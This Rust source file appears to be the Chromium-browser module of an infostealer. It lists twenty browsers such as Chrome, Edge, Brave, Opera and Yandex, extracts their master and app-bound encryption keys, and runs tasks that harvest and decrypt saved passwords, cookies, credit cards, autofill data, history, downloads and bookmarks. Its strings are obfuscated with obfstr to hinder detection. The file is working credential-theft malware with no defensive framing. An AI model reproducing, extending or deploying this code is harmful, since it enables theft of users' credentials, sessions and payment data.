mod cookies;
mod bookmarks;
mod autofill;
mod passwords;
mod creditcards;
mod downloads;
mod history;

use crate::chromium::autofill::AutoFillTask;
use crate::chromium::bookmarks::BookmarksTask;
use crate::chromium::cookies::CookiesTask;
use crate::chromium::creditcards::CreditCardsTask;
use crate::chromium::downloads::DownloadsTask;
use crate::chromium::history::HistoryTask;
use crate::chromium::passwords::PasswordsTask;
use crate::vec;
use alloc::borrow::ToOwned;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use obfstr::obfstr as s;
use tasks::{composite_task, CompositeTask, Task};
use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
use utils::path::Path;

pub struct ChromiumTask {
    tasks: Vec<(ChromiumBasedBrowser, CompositeTask)>,
}

impl ChromiumTask {
    pub(crate) fn new() -> Self {
        let all_browsers = get_chromium_browsers();
        let mut tasks = vec![];

        for base_browser in all_browsers {
            let Some(browser) = get_browser(&base_browser) else {
                continue
            };

            let browser = Arc::new(browser);

            tasks.push((
                base_browser,
                composite_task!(
                    CookiesTask::new(browser.clone()),
                    BookmarksTask::new(browser.clone()),
                    AutoFillTask::new(browser.clone()),
                    PasswordsTask::new(browser.clone()),
                    DownloadsTask::new(browser.clone()),
                    CreditCardsTask::new(browser.clone()),
                    HistoryTask::new(browser.clone()),
                )
            ))
        }

        Self {
            tasks
        }
    }
}

fn get_browser(browser: &ChromiumBasedBrowser) -> Option<BrowserData> {
    if !browser.user_data.is_exists() {
        return None;
    }

    let master_key = extract_master_key(&browser.user_data);
    let app_bound_encryption_key = browser.executable.as_ref()
        .and_then(|executable| extract_app_bound_encrypted_key(executable, &browser.user_data));
    
    if !browser.has_profiles {
        return Some(BrowserData {
            master_key,
            app_bound_encryption_key,
            profiles: vec![browser.user_data.clone()]
        })
    }

    let mut profiles = vec![];

    for profile in browser.user_data.list_files_filtered(&|path| path.is_dir())? {
        let Some(profile_files) = profile.list_files_filtered(&is_in_profile_folder) else {
            continue
        };

        if profile_files.is_empty() {
            continue;
        }

        profiles.push(profile);
    }

    if profiles.is_empty() {
        None
    } else {
        Some(BrowserData {
            master_key,
            app_bound_encryption_key,
            profiles
        })
    }
}

fn is_in_profile_folder(path: &Path) -> bool {
    path.fullname()
        .map(|name| name.ends_with("Profile.ico") || name.ends_with("LOG"))
        .unwrap_or(false)
}

impl Task for ChromiumTask {
    unsafe fn run(&self, parent: &Path) {
        for (browser, task) in &self.tasks {
            let parent = parent / &browser.name;
            unsafe { task.run(&parent) }
        }
    }
}

pub(super) struct BrowserData {
    master_key: Option<Vec<u8>>,
    app_bound_encryption_key: Option<Vec<u8>>,
    profiles: Vec<Path>,
}

impl BrowserData {
    pub(super) unsafe fn decrypt_data(&self, buffer: &[u8]) -> Option<String> {
        unsafe {
            utils::browsers::chromium::decrypt_data(
                buffer,
                self.master_key.as_deref(),
                self.app_bound_encryption_key.as_deref()
            )
        }
    }
}

pub(super) struct ChromiumBasedBrowser {
    name: String,
    executable: Option<Path>,
    has_profiles: bool,
    user_data: Path
}

macro_rules! browser_without_profiles {
    (
        name: $name:expr,
        executable: $executable:expr,
        data: $path:expr
    ) => {
        ChromiumBasedBrowser { 
            name: obfstr::obfstr!($name).to_owned(),
            executable: Some($executable),
            has_profiles: false,
            user_data: $path
        }
    };
    (
        name: $name:expr,
        data: $path:expr
    ) => {
        ChromiumBasedBrowser {
            name: obfstr::obfstr!($name).to_owned(),
            executable: None,
            has_profiles: false,
            user_data: $path
        }
    };
}
macro_rules! browser {
    (
        name: $name:expr,
        executable: $executable:expr,
        data: $path:expr
    ) => {
        ChromiumBasedBrowser { 
            name: obfstr::obfstr!($name).to_owned(),
            executable: Some($executable),
            has_profiles: true, 
            user_data: $path
        }
    };
    (
        name: $name:expr,
        data: $path:expr
    ) => {{
        ChromiumBasedBrowser {
            name: obfstr::obfstr!($name).to_owned(),
            executable: None,
            has_profiles: true,
            user_data: $path
        }
    }};
}

fn get_chromium_browsers() -> [ChromiumBasedBrowser; 20] {
    let local = Path::localappdata();
    let appdata = Path::appdata();
    let program_files = Path::program_files();
    let program_files_x86 = Path::program_files_x86();
    let user_data = s!("User Data").to_owned();

    // TODO: More executables
    [
        browser!(
            name: "Amingo",
            data: &local / s!("Amingo") / &user_data
        ),

        browser!(
            name: "Torch",
            data: &local / s!("Torch") / &user_data
        ),

        browser!(
            name: "Kometa",
            data: &local / s!("Kometa") / &user_data
        ),

        browser!(
            name: "Orbitum",
            data: &local / s!("Orbitum") / &user_data
        ),

        browser!(
            name: "Epic Private",
            data: &local / s!("Epic Privacy Browser") / &user_data
        ),

        browser!(
            name: "Cent",
            data: &local / s!("CentBrowser") / &user_data
        ),

        browser!(
            name: "Vivaldi",
            data: &local / s!("Vivaldi") / &user_data
        ),

        browser!(
            name: "Chromium",
            executable: &program_files / s!("Google") / s!("Chrome") / s!("Application") / s!("chrome.exe"),
            data: &local / s!("Chromium") / &user_data
        ),

        browser!(
            name: "Thorium",
            data: &local / s!("Thorium") / &user_data
        ),

        browser_without_profiles!(
            name: "Opera",
            data: &appdata / s!("Opera Software") / s!("Opera Stable")
        ),

        browser_without_profiles!(
            name: "Opera GX",
            data: &appdata / s!("Opera Software") / s!("Opera GX Stable")
        ),

        browser!(
            name: "7Star",
            data: &local / s!("7Star") / s!("7Star") / &user_data
        ),

        browser!(
            name: "Sputnik",
            data: &local / s!("Sputnik") / s!("Sputnik") / &user_data
        ),

        browser!(
            name: "Chrome SxS",
            data: &local / s!("Google") / s!("Chrome SxS") / &user_data
        ),

        browser!(
            name: "Chrome",
            data: &local / s!("Google") / s!("Chrome") / &user_data
        ),

        browser!(
            name: "Edge",
            executable: &program_files_x86 / s!("Microsoft") / s!("Edge") / s!("Application") / s!("msedge.exe"),
            data: &local / s!("Microsoft") / s!("Edge") / &user_data
        ),

        browser!(
            name: "Uran",
            data: &local / s!("uCozMedia") / s!("Uran") / &user_data
        ),

        browser!(
            name: "Yandex",
            data: &local / s!("Yandex") / s!("YandexBrowser") / &user_data
        ),

        browser!(
            name: "Brave",
            executable: &program_files / s!("BraveSoftware") / s!("Brave-Browser") / s!("Application") / s!("Brave.exe"),
            data: &local / s!("BraveSoftware") / s!("Brave-Browser") / &user_data
        ),

        browser!(
            name: "Atom",
            data: &local / s!("Mail.Ru") / s!("Atom") / &user_data
        ),
    ]
}